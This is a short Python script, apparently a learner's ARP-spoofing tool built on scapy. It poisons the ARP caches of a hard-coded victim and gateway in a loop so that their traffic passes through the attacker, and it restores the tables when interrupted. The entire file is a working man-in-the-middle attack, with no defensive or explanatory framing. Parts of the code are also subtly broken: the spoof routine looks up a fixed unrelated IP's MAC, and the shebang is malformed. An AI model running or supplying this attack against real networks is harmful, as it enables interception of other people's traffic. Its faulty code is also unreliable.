#!usr/env python
import time

import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc
def spoof(target_ip, spoof_if):
    target_mac = get_mac("192.168.5.2")
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_if)
    scapy.send(arp_packet)

def restore_arp_table(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = "10.0.3.7"
gateway_router_ip = "10.0.3.1"
try:
    packets_sent_count = 0
    while True:
        spoof(target_ip, gateway_router_ip)
        spoof(gateway_router_ip, target_ip)
        packets_sent_count = packets_sent_count +2
        print("\r[+] Packets sent: " + str(packets_sent_count))
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Ctrl + C pressed... Restoring ARP tables...Pleas wait....\n")
    restore_arp_table(gateway_router_ip, target_ip)
    restore_arp_table(target_ip, gateway_router_ip)